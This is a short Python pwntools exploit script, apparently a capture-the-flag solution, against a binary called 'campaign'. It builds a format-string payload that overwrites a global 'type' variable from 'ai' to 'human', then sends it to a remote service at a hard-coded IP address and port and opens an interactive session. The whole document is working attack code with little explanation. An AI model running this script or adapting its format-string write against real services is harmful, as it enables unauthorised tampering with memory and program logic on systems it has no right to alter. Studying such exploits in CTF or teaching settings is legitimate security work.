from pwn import *

context.binary = ELF("./campaign", checksec=False)


def build_payload() -> bytes:
    type_addr = context.binary.symbols["type"]

    # We only need to turn "ai" into "human\0".
    # Split it into:
    #   type+2 <- 0x616d ("ma")
    #   type+4 <- 0x6e   ("n")
    #   type+0 <- 0x7568 ("hu")
    #
    # On the remote service, the first qword of the stack buffer is reachable
    # as %8$..., so pwntools can build the compact format string directly.
    return fmtstr_payload(
        8,
        {
            type_addr + 2: p16(0x616D),
            type_addr + 4: p8(0x6E),
            type_addr + 0: p16(0x7568),
        },
        write_size="short",
    )


def main() -> None:
    io = remote("133.88.122.244", 32414)
    io.sendlineafter(b"Name: ", build_payload())
    io.sendlineafter(b"Phone: ", b"1")
    io.interactive()


if __name__ == "__main__":
    main()
